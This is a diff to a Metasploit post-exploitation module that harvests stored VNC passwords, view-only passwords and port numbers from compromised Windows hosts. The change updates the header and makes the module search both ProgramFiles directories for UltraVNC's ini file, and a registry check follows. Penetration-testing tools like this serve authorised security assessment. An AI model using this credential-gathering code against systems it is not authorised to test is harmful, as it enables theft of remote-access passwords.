@@ -1,16 +1,12 @@
 # post/windows/gather/enum_vnc_pw.rb
 
 ##
-# This file is part of the Metasploit Framework and may be subject to
-# redistribution and commercial restrictions. Please see the Metasploit
-# web site for more information on licensing and terms of use.
-#   http://metasploit.com/
+# This module requires Metasploit: http//metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
 ##
 
 require 'msf/core'
 require 'rex'
-require 'msf/core/post/windows/registry'
-require 'msf/core/post/windows/user_profiles'
 require 'msf/core/auxiliary/report'
 
 
@@ -102,11 +98,15 @@ class Metasploit3 < Msf::Post
     locations = []
 
     #Checks
-    locations << {:name => 'UltraVNC',
-      :check_file => session.fs.file.expand_path("%PROGRAMFILES%")+'\\UltraVNC\\ultravnc.ini',
-      :pass_variable => 'passwd=',
-      :viewonly_variable => 'passwd2=',
-      :port_variable => 'PortNumber='}
+    progfiles_env = session.sys.config.getenvs('ProgramFiles', 'ProgramFiles(x86)')
+    progfiles_env.each do |k, v|
+      next if v.blank?
+      locations << {:name => 'UltraVNC',
+        :check_file => "#{v}\\UltraVNC\\ultravnc.ini",
+        :pass_variable => 'passwd=',
+        :viewonly_variable => 'passwd2=',
+        :port_variable => 'PortNumber='}
+    end
 
     locations << {:name => 'WinVNC3_HKLM',
       :check_reg => 'HKLM\\Software\\ORL\\WinVNC3',
